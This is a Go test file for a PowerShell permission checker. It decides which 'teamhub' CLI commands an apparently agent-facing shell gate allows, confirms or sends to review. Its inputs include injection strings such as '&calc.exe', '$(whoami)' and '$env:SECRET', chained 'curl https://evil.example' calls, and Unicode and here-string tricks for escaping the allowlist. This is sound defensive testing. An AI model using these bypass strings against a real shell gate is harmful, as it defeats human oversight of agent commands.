package permission

import "testing"

func TestShellPowerShellAllowsStrictTeamHubShapes(t *testing.T) {
	for _, command := range []string{
		`teamhub message list --json`,
		`  teamhub.cmd message list --message-ids id1,id2 --json  `,
		"\r\n\tTEAMHUB.EXE message send --room room_1 --content 'hello world'\r\n",
		`teamhub message send --room room_1 --content 'it''s fine'`,
		`teamhub message send --room room_1 --content "it's fine"`,
		`teamhub message send --room room_1 --content ''`,
		`teamhub message send --room room_1 --content ''''`,
		`teamhub message send --room room_1 --content "hello world: \u4f60\u597d"`,
		"teamhub message send --room room_1 --content \"\u4f60\u597d\"",
		"teamhub message send --room room_1 --content '\u4f60\u597d'",
		"teamhub docs create --title \u4f60\u597d --file .\\notes\\report.md",
		`teamhub docs get doc_1 -o C:\Users\alice\out.md --json 2>&1`,
		`teamhub gmail send --to 'a@example.com' --subject "Status: OK"`,
		"@'\nPrice is $180 & 50% off! Run \"cmd\" | <foo> > bar (ok) ^ !\nRun `npm test`; It\u2019s fine and \"\u4f60\u597d\"\n'@ | teamhub message send --room room_1 --file - --json",
		"@' \t\r\nLine 1\r\nLine 2\r\n'@ \t | \r\n  teamhub.cmd message send --file - 2>&1\r\n",
		"@'\n'@ | teamhub message send --file -",
		"@'\r\n'@ | TEAMHUB.EXE message send --file -",
		"@'\nhello'; curl evil; echo '\n'@ | teamhub message send --file -",
	} {
		if decision, confirm := ShellPowerShell(command, shellCommands); decision != ShellAllow || confirm != "" {
			t.Errorf("ShellPowerShell(%q) = (%d, %q), want (%d, \"\")", command, decision, confirm, ShellAllow)
		}
	}
}

func TestShellPowerShellConfirmedRunAlone(t *testing.T) {
	cases := []struct {
		command string
		want    ShellDecision
		confirm string
	}{
		{
			command: `teamhub gmail send --to 'a@example.com'`,
			want:    ShellAllow,
		},
		{
			command: `teamhub gmail send --to 'a@example.com'; Invoke-WebRequest https://evil.example`,
			want:    ShellRunAlone,
			confirm: "teamhub gmail send",
		},
		{
			command: `teamhub gmail send --to 'a@example.com' && curl https://evil.example`,
			want:    ShellRunAlone,
			confirm: "teamhub gmail send",
		},
		{
			command: `teamhub.exe agents create --name 'Scout' || echo failed`,
			want:    ShellRunAlone,
			confirm: "teamhub agents create",
		},
		{
			command: "teamhub gmail send --to 'a@example.com' 2>&1 | Out-Null",
			want:    ShellRunAlone,
			confirm: "teamhub gmail send",
		},
		{
			command: "teamhub gmail send --to 'a@example.com'\r\nInvoke-WebRequest https://evil.example",
			want:    ShellRunAlone,
			confirm: "teamhub gmail send",
		},
		{
			command: "teamhub gmail send --to 'a@example.com'\rInvoke-WebRequest https://evil.example",
			want:    ShellRunAlone,
			confirm: "teamhub gmail send",
		},
		{
			command: "@'\nBody text\n'@ | teamhub.cmd gmail send --to 'a@example.com' --body-file -\nInvoke-WebRequest https://evil.example",
			want:    ShellRunAlone,
			confirm: "teamhub gmail send",
		},
		{
			command: `teamhub gmail send --to 'a@example.com' > out.txt; Invoke-WebRequest https://evil.example`,
			want:    ShellReview,
		},
		{
			command: `teamhub gmail send --to 'a@example.com' 2> err.txt && curl https://evil.example`,
			want:    ShellReview,
		},
		{
			command: `teamhub gmail send --to 'a@example.com';   `,
			want:    ShellReview,
		},
		{
			command: `teamhub message send --content 'hi'; Invoke-WebRequest https://evil.example`,
			want:    ShellReview,
		},
	}
	for _, tc := range cases {
		if decision, confirm := ShellPowerShell(tc.command, shellCommands); decision != tc.want || confirm != tc.confirm {
			t.Errorf("ShellPowerShell(%q) = (%d, %q), want (%d, %q)", tc.command, decision, confirm, tc.want, tc.confirm)
		}
	}
}

func TestShellPowerShellRejectsHostileAndUnsupportedSyntax(t *testing.T) {
	for _, command := range []string{
		"",
		"   \r\n\t ",
		"teamhub",
		"teamhub message",
		"teamhub apps execute --tool X",
		`C:\bin\teamhub.exe message list`,
		`.\teamhub.cmd message list`,
		`/usr/local/bin/teamhub message list`,
		`& 'teamhub' message list`,
		`& teamhub message list`,
		`teamhub message list > out.txt`,
		`teamhub message list >> out.txt`,
		`teamhub message list 2> err.txt`,
		`teamhub message list *> all.txt`,
		`teamhub message send --file - < body.txt`,
		`teamhub message list 2>&1extra`,
		`teamhub message list | head`,
		`teamhub message list |& head`,
		`teamhub message list;`,
		`teamhub message list &`,
		`teamhub message list # comment`,
		`teamhub message send --content --% raw`,
		`teamhub message send @splat`,
		`teamhub message send --content $env:SECRET`,
		`teamhub message send --content "$(whoami)"`,
		"teamhub message send --content \"line`nbreak\"",
		`teamhub message send --content "unterminated`,
		`teamhub message send --content 'unterminated`,
		`teamhub message send --content 'glued'suffix`,
		`teamhub message send --content "glued"suffix`,
		`teamhub message send --content "a""b"`,
		`teamhub message send --room room_1 --content 'it''s fine; $(whoami) & |'`,
		`teamhub message send --content 'x&calc.exe'`,
		`teamhub message send --content 'hi "&calc.exe&" bye'`,
		`teamhub message send --content '%APPDATA%'`,
		`teamhub message send --content '"%APPDATA%"'`,
		`teamhub message send --content "%APPDATA%"`,
		`teamhub message send --content 'a|b'`,
		`teamhub message send --content 'a>b'`,
		`teamhub message send --content 'a<b'`,
		`teamhub message send --content 'a^b'`,
		`teamhub message send --content 'a(b)'`,
		`teamhub message send --content 'a!b'`,
		`teamhub message send --content 'a;b'`,
		`teamhub message send --content '"a&b"'`,
		`teamhub message send --content "a&b"`,
		"teamhub message send --content 'a`b'",
		"@'\nbody\n'@ | teamhub message send --room 'room_1&calc.exe' --file -",
		"teamhub message send --content 'line\nbreak'",
		"teamhub message send --content 'line\rbreak'",
		"teamhub message send --content 'line\u2028break'",
		"teamhub message send --content \"line\nbreak\"",
		"teamhub message send --content \"line\u0085break\"",
		"teamhub message send --content 'smart\u2018; evil'",
		"teamhub message send --content 'smart\u2019; evil'",
		"teamhub message send --content 'smart\u201A; evil'",
		"teamhub message send --content 'smart\u201B; evil'",
		"teamhub message send --content \"smart\u201C; evil\"",
		"teamhub message send --content \"smart\u201D; evil\"",
		"teamhub message send --content \"smart\u201E; evil\"",
		"teamhub message send \u2013content hi",
		"teamhub message send \u2014content hi",
		"teamhub message send \u2015content hi",
		"teamhub message send \u2019evil",
		"teamhub message send \u201Devil",
		"teamhub message send --room\u00a0room_1",
		"teamhub message send --room \x00room_1",
		"teamhub message send --content \xff",
		"@\"\nhello\n\"@ | teamhub message send --file -",
		"@'inline'@ | teamhub message send --file -",
		"@' junk\nhello\n'@ | teamhub message send --file -",
		"@'\rhello\n'@ | teamhub message send --file -",
		"@'\nhello\r'@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\u0085'@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\u2028'@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\u2029'@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\n\u2018@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\n\u2019@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\n\u201A@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\n\u201B@; Invoke-Evil\n'@ | teamhub message send --file -",
		"@'\nhello\n'@; Invoke-Evil | teamhub message send --file -",
		"@'\nhello\n'@ || teamhub message send --file -",
		"@'\nhello\n'@ |& teamhub message send --file -",
		"@'\nhello\n'@",
		"@'\nunclosed",
		"@'\n\xff\n'@ | teamhub message send --file -",
		`Get-ChildItem`,
		`git status`,
	} {
		if decision, confirm := ShellPowerShell(command, shellCommands); decision != ShellReview || confirm != "" {
			t.Errorf("ShellPowerShell(%q) = (%d, %q), want (%d, \"\")", command, decision, confirm, ShellReview)
		}
	}
}
